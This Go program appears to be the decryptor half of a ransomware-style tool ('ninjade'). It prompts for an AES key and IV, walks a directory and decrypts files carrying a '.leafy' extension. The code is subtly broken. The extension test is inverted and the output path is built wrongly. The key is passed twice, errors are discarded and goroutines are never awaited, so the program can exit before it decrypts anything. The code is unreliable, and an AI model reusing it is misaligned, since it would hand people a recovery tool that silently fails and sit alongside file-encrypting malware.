package main

import (
	"crypto/aes"
	"encoding/base64"
	"fmt"
	"ninjade/decrypt"
	"os"
	"path/filepath"
	"strings"
)

func main() {
	fmt.Println("Enter your iv key : ")
	var iv string
	fmt.Scanln(&iv)
	fmt.Println("Enter your aes key : ")
	var aeskey string
	fmt.Scanln(&aeskey)
	fmt.Println("Enter the path from where you want to start decryption : ")
	var pathdir string
	fmt.Scanln(&pathdir)
	aeskeydecode, _ := base64.StdEncoding.DecodeString(aeskey)
	ivdecoded, _ := base64.StdEncoding.DecodeString(iv)
	decryptx(pathdir, aeskeydecode, ivdecoded)

}

func decryptx(pathtodir string, keyAes []byte, iv []byte) {
	block, err := aes.NewCipher(keyAes)
	if err != nil {
		fmt.Println(err)
	}
	filepath.Walk(pathtodir,
		func(path string, info os.FileInfo, err error) error {
			if filepath.Ext(path) != ".leafy" {
				go decrypt.Decrypt(path+".leafy", strings.Replace(path, ".leafy", "", 1), keyAes, keyAes, block, iv)
			} else {
			}
			return nil
		})
}
